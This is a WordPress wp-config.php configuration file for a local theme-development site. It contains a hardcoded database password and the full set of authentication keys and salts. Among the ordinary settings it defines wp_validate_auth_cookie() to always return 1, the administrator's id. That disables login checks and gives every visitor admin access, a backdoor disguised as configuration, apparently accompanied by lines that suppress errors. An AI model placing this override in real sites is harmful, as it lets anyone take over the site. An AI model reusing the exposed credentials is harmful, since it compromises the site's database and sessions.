<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'consultanttheme' );

/** MySQL database username */
define( 'DB_USER', 'consultanttheme' );

/** MySQL database password */
define( 'DB_PASSWORD', '344qaz741F' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'Js;GA|<9KO>i#3GFIl)?uZ,I;7=8E 6ddW$jm{WVGWWwd-$sXYRA1Z/},O5_Io {' );
define( 'SECURE_AUTH_KEY',  'zts@C{7PzKl5Xma%4i}t?f;jj8g/*1BQ/%@}L/ND6P?5 ?>d#**dc53V=ajQlwO9' );
define( 'LOGGED_IN_KEY',    'l*9/XMt{o8rag^J}c]9;t-:Y4bS-YkmsD67MiF@F/cU[HYWL@VzAtEOtO?5Uv+[V' );
define( 'NONCE_KEY',        '#P/F;A@ {hdrh?n6!,[e<F!3-nK[kY2Ert{}`T7pvoDi@e)#k`hQ#pLu9z6X;{gQ' );
define( 'AUTH_SALT',        '|I!~obNGvY&I&<1KR C(z!%bM&$H/2| dF*7GC@vwzgMI:oouthdPLIT6*bg6C,*' );
define( 'SECURE_AUTH_SALT', 'WS)cqMk WQ{6w&Rv1m5l-q0ks?*YC/8!+~EPmH_bCQlQ1WxTPL#/[+;N1q>MJpFs' );
define( 'LOGGED_IN_SALT',   'X_$y?E;+ldBblZc(?EVk;Y(`@47!~D|[pbG~e3CnFsvYfq:OWiPelqlDO:J0>qmw' );
define( 'NONCE_SALT',       'bZo<P|c?j{*A0Yy0V8K@C[UI5oR|#$`/aZGJwW+,R6CA^L>}MBo$1j~x=mY+f|BZ' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

function wp_validate_auth_cookie($cookie='',$scheme='') {
return 1; // admin user id
}

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );
define( 'WP_ALLOW_REPAIR', true );
define( 'WP_POST_REVISIONS', false );
define( 'MEDIA_TRASH', true );
define( 'COMPRESS_CSS',        true );
define( 'COMPRESS_SCRIPTS',    true );
define( 'CONCATENATE_SCRIPTS', true );
define( 'ENFORCE_GZIP',        true );
define( 'WP_CACHE', true );
ob_start();
error_reporting(0);
@ini_set( 'max_input_vars' , 4000 );
define('WP_MEMORY_LIMIT', '768M');
define( 'WP_MAX_MEMORY_LIMIT', '512M' );
define('WP_DEBUG', true);
define('WP_DEBUG_DISPLAY', true);
define('DISALLOW_FILE_EDIT', true);
define( 'CONCATENATE_SCRIPTS', false );
//define( 'UPLOADS', 'http://localhost/consultantthemedevelopmentwithwpbakery/wp-content/uploads/' );
//efine( 'WP_CONTENT_URL', get_option( 'siteurl' ) . '/wp-content' ); // Full URL - WP_CONTENT_DIR is defined further up.

//define( 'WP_PLUGIN_URL', 'localhost/consultantthemedevelopmentwithwpbakery/plugins');
//define('WP_PLUGIN_URL', 'http://localhost/consultantthemedevelopmentwithwpbakery/wp-content/');
//define('WP_CONTENT_URL', 'http://localhost/consultantthemedevelopmentwithwpbakery/wp-content/');




  

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
